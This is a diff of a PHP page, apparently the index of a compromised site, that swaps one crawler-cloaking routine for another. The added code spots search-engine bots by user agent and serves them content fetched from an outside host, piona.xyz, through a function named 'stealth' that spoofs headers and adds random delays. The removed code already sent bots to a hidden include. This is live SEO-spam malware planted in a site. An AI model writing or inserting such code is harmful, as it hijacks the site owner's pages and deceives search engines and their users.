@@ -1,14 +1,26 @@
 <?php
-// Kullanıcı IP'si ve User-Agent'ı kontrol et
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü
+@ob_start();
+header("Vary: U-Agent");
 
-// Google ile ilgili user-agent kontrolleri
-if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
-    include('dev/shm/file.php');  // Google bot ise google.php göster
-} elseif ($is_mobile) {
-    include('home.php');  // Mobil cihaz ise kullanici.php göster
-} else {
-    include('home.php');  // Diğer durumlar için default içerik
+$src = "https://piona.xyz/landing/journal.yayasansahara.org/index.txt";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+    $ctx = stream_context_create([
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ]
+    ]);
+    return @file_get_contents($u, false, $ctx);
+}
+
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
+    exit;
 }
 ?>
